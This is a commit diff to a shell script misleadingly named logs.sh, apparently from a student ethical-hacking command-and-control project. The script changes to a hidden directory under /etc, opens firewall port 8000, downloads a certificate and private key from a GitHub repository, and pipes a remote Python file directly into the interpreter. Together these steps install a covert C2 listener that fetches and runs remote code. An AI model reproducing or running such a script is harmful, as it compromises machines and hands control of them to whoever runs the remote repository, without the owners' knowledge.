799b476f3720de7ad760323de3da0e9177aa869e
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-26 19:04:34 -0500

    Modify curl commands to download cert and key files
    Updated curl commands to save files directly instead of using tee.

--- logs.sh
+++ logs.sh
@@ -1,10 +1,8 @@
 #!/bin/bash
 cd /etc/.python-certifications/
 firewall-cmd --add-port=8000/tcp
-curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem \
-  | sudo tee /etc/.python-certifications/cert.pem > /dev/null
+curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem -o cert.pem
 
-curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/key.pem \
-  | sudo tee /etc/.python-certifications/key.pem > /dev/null
+curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/key.pem -o key.pem
   
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/week4.py | python
